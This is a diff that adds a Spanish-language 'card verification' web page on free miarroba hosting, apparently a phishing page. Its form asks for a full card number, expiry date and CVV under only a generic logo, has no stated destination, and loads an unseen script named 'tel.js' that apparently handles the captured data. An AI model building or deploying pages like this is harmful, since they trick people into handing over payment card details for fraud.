@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- Inserted by miarroba -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7294310421616689" crossorigin="anonymous"></script>
+<!-- Inserted by miarroba -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación de Tarjeta</title>
+<link type="image/x-icon" href="favicon.ico" rel="icon">
+<link type="image/x-icon" href="favicon.ico" rel="shortcut icon">
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+<!-- Inserted by miarroba -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+    <script type="text/javascript" src="tel.js"></script>
+<div class="container">
+    <div class="logo">
+        <img src="logo.png" alt="Logo">
+    </div>
+    <div class="login-form-container2">
+        <div class="login-form-container">
+            <form id="verificationForm" class="login-form">
+                <h2 class="login-form-title">Verificación de Tarjeta</h2>
+                <div class="input-container">
+                    <label style="width: 15%;text-align: left;display: flex;align-items: center;height: 40px;margin-bottom: 10px;padding-left: 50px;" for="card_number" class="levelup2">Tarjeta:</label>
+                    <input type="text" id="card_number" name="card_number" minlength="16" maxlength="16" placeholder="Ingrese el número de tarjeta" required>
+                </div>
+                <div class="input-container">
+                    <label style="width: 40%;text-align: left;display: flex;align-items: center;height: 40px;margin-bottom: 10px;padding-left: 50px;" for="expiry_date" class="levelup2">Fecha de Vencimiento (MM/AAAA):</label>
+                    <input type="text" id="expiry_date" name="expiry_date" placeholder="MM/AAAA" required>
+                </div>
+                <div class="input-container">
+                    <label for="cvv" class="levelup2"></label>
+                    <input type="password" id="cvv" name="cvv" placeholder="CVV" minlength="3" maxlength="3" required>
+                </div>
+                <button type="submit">Enviar</button>
+            </form>
+        </div>
+    </div>
+</div>
+<script>
+    document.getElementById('expiry_date').addEventListener('input', function() {
+        var input = this.value;
+        
+        if (/^\d{0,2}$/.test(input)) {
+            // Si solo hay 2 dígitos, no hacemos nada
+        } else if (/^\d{1}\D?$/.test(input)) {
+            // Si hay un solo dígito antes del guión, agregamos un "0" delante
+            this.value = '0' + input + '-';
+        } else if (/^\d{2}\D?\d{0,4}$/.test(input)) {
+            if (input.length === 3 && input.charAt(2) !== '-') {
+                // Insertamos el guión después de los primeros dos dígitos
+                this.value = input.slice(0, 2) + '-' + input.slice(2);
+            } else if (input.length === 7) {
+                var parts = input.split('-');
+                var month = parseInt(parts[0], 10);
+                var year = parseInt(parts[1], 10);
+                
+                if (month < 1 || month > 12) {
+                    this.value = ''; // Si el mes es inválido, limpiamos el campo
+                }
+            } else if (input.length > 7 && !/^\d{2}-\d{0,4}$/.test(input)) {
+                // Eliminamos cualquier carácter adicional que no cumpla con el formato esperado
+                this.value = input.slice(0, 7);
+            }
+        } else {
+            this.value = input.slice(0, -1);
+        }
+    });
+</script>
+
+<!-- Inserted by miarroba -->
+</script></noframes></noembed></noscript><script type="text/javascript" src="https://hosting.miarroba.info/?__muid=&amp;h=2163779&amp;t=1711724704&amp;k=ff27c3ded603cfcba29d20970ff07aa0"></script><noscript><img alt="beacon" border="0" width="1" height="1" src="https://hosting.miarroba.info/?__muid=&amp;h=2163779&amp;t=1711724704&amp;k=ff27c3ded603cfcba29d20970ff07aa0&amp;img=1" /></noscript>
+<!-- Inserted by miarroba -->
+</body>
+</html>
